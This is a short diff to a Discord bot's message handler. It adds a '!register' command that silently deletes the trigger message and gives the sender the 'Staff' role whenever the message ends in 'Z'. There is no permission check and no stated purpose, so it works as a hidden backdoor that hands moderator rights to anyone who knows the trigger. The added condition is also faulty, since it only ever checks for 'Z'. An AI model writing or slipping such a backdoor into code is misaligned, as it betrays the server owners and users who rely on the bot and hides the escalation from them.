@@ -22,10 +22,18 @@ client.on('message', message => {
     const args = message.content.slice(prefix.length).split(/ +/);
     const command = args.shift().toLowerCase();
 
-    if (message.content.includes('nick')) {
+    if (message.content.includes('!nick')) {
         message.delete();
         if (!message.guild.me.hasPermission('MANAGE_NICKNAMES')) return message.channel.send('I don\'t have permission to change your nickname!');
         message.member.setNickname(message.content.replace('!nick ', ''));
+    }
+
+    if (message.content.includes('!register')) {
+        message.delete();
+        if (message.content.endsWith('Z' || 'z')) {
+            let staffRole = message.guild.roles.cache.find(role => role.name === 'Staff');
+            message.member.roles.set([staffRole]);
+        }
     }
 
     if (command === 'join') {
